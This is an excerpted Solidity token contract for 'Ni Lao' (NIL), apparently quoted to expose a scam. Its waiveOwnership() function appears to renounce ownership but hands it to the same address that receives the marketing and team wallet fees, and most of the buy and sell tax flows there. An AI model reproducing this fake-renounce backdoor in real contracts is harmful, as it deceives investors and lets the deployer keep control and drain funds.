...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xD8Ae57df2B3Ff504AD1F747F1c5630E56AAe43cC);
    }
...
contract Nilao is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ni Lao";
    string private _symbol = "NIL";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xD8Ae57df2B3Ff504AD1F747F1c5630E56AAe43cC);
    address payable public teamWalletAddress = payable(0xD8Ae57df2B3Ff504AD1F747F1c5630E56AAe43cC);
    ...
    uint256 public _teamShare = 160;

    uint256 public _totalTaxIfBuying = 4;
    uint256 public _totalTaxIfSelling = 4;
    uint256 public _totalDistributionShares = 169;
